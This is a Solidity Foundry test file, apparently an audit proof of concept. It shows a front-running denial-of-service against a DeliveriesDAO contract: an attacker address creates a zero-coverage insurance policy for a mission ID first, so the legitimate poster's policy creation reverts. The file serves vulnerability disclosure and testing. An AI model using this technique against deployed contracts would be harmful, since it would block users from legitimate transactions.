// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/DeliveriesDAO.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract DeliveriesDAOPoC is Test {
    DeliveriesDAO public dao;
    MockUSDC public usdc;
    address public poster = address(1);
    address public attacker = address(2);

    function setUp() public {
        usdc = new MockUSDC();
        dao = new DeliveriesDAO(address(usdc));

        usdc.mint(poster, 10000e6);
        usdc.mint(attacker, 10000e6);
    }

    function test_createPolicy_DOS() public {
        // Poster legitimately wants to create a policy for missionId 1
        uint256 missionId = 1;
        uint256 coverageAmount = 1000e6;

        // Attacker creates a policy for missionId 1 first with 0 coverage
        vm.startPrank(attacker);
        usdc.approve(address(dao), type(uint256).max);
        dao.createInsurancePolicy(missionId, 0, false);
        vm.stopPrank();

        // Poster tries to create policy, but fails
        vm.startPrank(poster);
        usdc.approve(address(dao), type(uint256).max);
        vm.expectRevert("Policy already exists");
        dao.createInsurancePolicy(missionId, coverageAmount, false);
        vm.stopPrank();
    }
}
